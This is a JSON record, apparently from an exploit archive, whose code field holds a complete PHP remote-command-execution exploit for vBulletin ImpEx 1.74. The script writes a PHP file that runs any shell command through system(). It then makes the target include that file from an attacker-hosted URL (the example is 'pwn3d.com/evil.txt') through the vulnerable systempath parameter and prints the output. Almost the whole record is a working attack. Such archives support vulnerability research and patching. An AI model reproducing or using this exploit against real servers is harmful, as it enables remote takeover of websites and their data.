{
  "id": "1668",
  "title": "vBulletin ImpEx 1.74 - Remote Command Execution",
  "cve": null,
  "vuln_type": "unknown",
  "code": "<?php\r\n/*\r\nvbulletin ImpEx Remote File Inclusion Exploit c0ded by ReZEN\r\nSh0uts: xorcrew.net, ajax, gml, #subterrain, My gf\r\nurl:  http://www.xorcrew.net/ReZEN\r\n\r\nexample:\r\nturl: http://www.target.com/impex/ImpExData.php?systempath=\r\nhurl:http://www.pwn3d.com/evil.txt?\r\n\r\n*/\r\n\r\n$cmd = $_POST[\"cmd\"];\r\n$turl = $_POST[\"turl\"];\r\n$hurl = $_POST[\"hurl\"];\r\n\r\n$form= \"<form method=\\\"post\\\" action=\\\"\".$PHP_SELF.\"\\\">\"\r\n     .\"turl:<br><input type=\\\"text\\\" name=\\\"turl\\\" size=\\\"90\\\" \r\nvalue=\\\"\".$turl.\"\\\"><br>\"\r\n     .\"hurl:<br><input type=\\\"text\\\" name=\\\"hurl\\\" size=\\\"90\\\" \r\nvalue=\\\"\".$hurl.\"\\\"><br>\"\r\n     .\"cmd:<br><input type=\\\"text\\\" name=\\\"cmd\\\" size=\\\"90\\\" \r\nvalue=\\\"\".$cmd.\"\\\"><br>\"\r\n     .\"<input type=\\\"submit\\\" value=\\\"Submit\\\" name=\\\"submit\\\">\"\r\n\r\n     .\"</form><HR WIDTH=\\\"650\\\" ALIGN=\\\"LEFT\\\">\";\r\n\r\nif (!isset($_POST['submit']))\r\n{\r\n\r\necho $form;\r\n\r\n}else{\r\n\r\n$file = fopen (\"test.txt\", \"w+\");\r\n\r\nfwrite($file, \"<?php system(\\\"echo ++BEGIN++\\\"); system(\\\"\".$cmd.\"\\\");\r\nsystem(\\\"echo ++END++\\\"); ?>\");\r\nfclose($file);\r\n\r\n$file = fopen ($turl.$hurl, \"r\");\r\nif (!$file) {\r\n     echo \"<p>Unable to get output.\\n\";\r\n     exit;\r\n}\r\n\r\necho $form;\r\n\r\nwhile (!feof ($file)) {\r\n     $line .= fgets ($file, 1024).\"<br>\";\r\n     }\r\n$tpos1 = strpos($line, \"++BEGIN++\");\r\n$tpos2 = strpos($line, \"++END++\");\r\n$tpos1 = $tpos1+strlen(\"++BEGIN++\");\r\n$tpos2 = $tpos2-$tpos1;\r\n$output = substr($line, $tpos1, $tpos2);\r\necho $output;\r\n\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-04-13]",
  "url": "https://www.exploit-db.com/exploits/1668"
}